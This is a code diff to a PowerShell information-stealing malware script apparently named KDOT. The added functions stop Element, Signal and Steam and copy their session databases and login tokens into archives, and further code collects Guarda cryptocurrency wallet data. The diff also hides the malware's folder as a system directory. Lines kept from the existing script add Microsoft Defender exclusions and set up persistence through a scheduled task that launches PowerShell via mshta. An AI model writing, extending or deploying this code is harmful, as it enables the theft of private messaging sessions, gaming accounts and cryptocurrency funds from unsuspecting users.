@@ -34,7 +34,7 @@ function EXFILTRATE-DATA {
 	# System Uptime
 	function Get-Uptime {
     $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
-    $uptimedata = '{0} day(s) {1} hour(s) {2} minute(s) {3} second(s)' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
+    $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
     $uptimedata
     }
     $uptime = Get-Uptime
@@ -88,6 +88,73 @@ function EXFILTRATE-DATA {
     Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
     }
     telegramstealer 
+	
+	# Element Session Stealer
+    function elementstealer {
+        $processName = "element"
+        try {
+            if (Get-Process $processName -ErrorAction SilentlyContinue) {
+                Get-Process -Name $processName | Stop-Process
+            }
+        } catch {
+         
+        }
+        $element_session = "$env:localappdata\temp\element-session"
+         New-Item -ItemType Directory -Force -Path $element_session
+         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
+         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
+         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
+         Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
+         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
+         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
+         $signal_zip = "$env:localappdata\temp\element-session.zip"
+         Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
+    }
+    elementstealer 
+	
+	# Signal Session Stealer
+    function signalstealer {
+         $processName = "Signal"
+         try {
+             if (Get-Process $processName -ErrorAction SilentlyContinue) {
+                 Get-Process -Name $processName | Stop-Process
+             }
+         } catch {
+          
+         }
+         $signal_session = "$env:localappdata\temp\signal-session"
+          New-Item -ItemType Directory -Force -Path $signal_session
+          $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
+          Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
+          Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
+          Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
+          Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
+          Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
+          $signal_zip = "$env:localappdata\temp\signal-session.zip"
+          Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
+     }
+     signalstealer 
+	 
+	 # Steam Session Stealer
+	 function steamstealer {
+         $processName = "steam"
+         try {
+             if (Get-Process $processName -ErrorAction SilentlyContinue) {
+                 Get-Process -Name $processName | Stop-Process
+             }
+         } catch {
+          
+         }
+         $steam_session = "$env:localappdata\temp\steam-session"
+         New-Item -ItemType Directory -Force -Path $steam_session
+         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
+         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
+		 (gci -path $steamfolder -Include "*.ssnf", -r) | Copy-Item -Destination $steam_session -Force
+		  $steam_zip = "$env:localappdata\temp\steam-session.zip"
+         Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
+        }
+      steamstealer 
+     
     
 	# Desktop screenshot
 	
@@ -199,6 +266,10 @@ function EXFILTRATE-DATA {
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
     New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
     Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
+    }
+	If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
+    New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
+    Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
     }
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
     New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
@@ -363,6 +434,9 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
 	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue
+	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" -ErrorAction SilentlyContinue
+	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" -ErrorAction SilentlyContinue
+	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" -ErrorAction SilentlyContinue
 	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" -ErrorAction SilentlyContinue
 	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" -ErrorAction SilentlyContinue
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
@@ -371,6 +445,9 @@ function EXFILTRATE-DATA {
     Remove-Item "$extracted\KDOT" -Recurse
 	Remove-Item "$filegrabber\Files Grabber" -recurse -force
 	Remove-Item "$crypto\Crypto Wallets" -recurse -force
+	Remove-Item "$extracted\element-session" -recurse -force
+	Remove-Item "$extracted\signal-session" -recurse -force
+	Remove-Item "$extracted\steam-session" -recurse -force
     Remove-Item "$extracted\main.exe"
 }
 
@@ -378,7 +455,12 @@ function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
     New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
-    $origin = $PSCommandPath
+	
+	# Hidden Directory
+	$KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
+    $KDOT_DIR.attributes="Hidden","System"
+    
+	$origin = $PSCommandPath
     Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
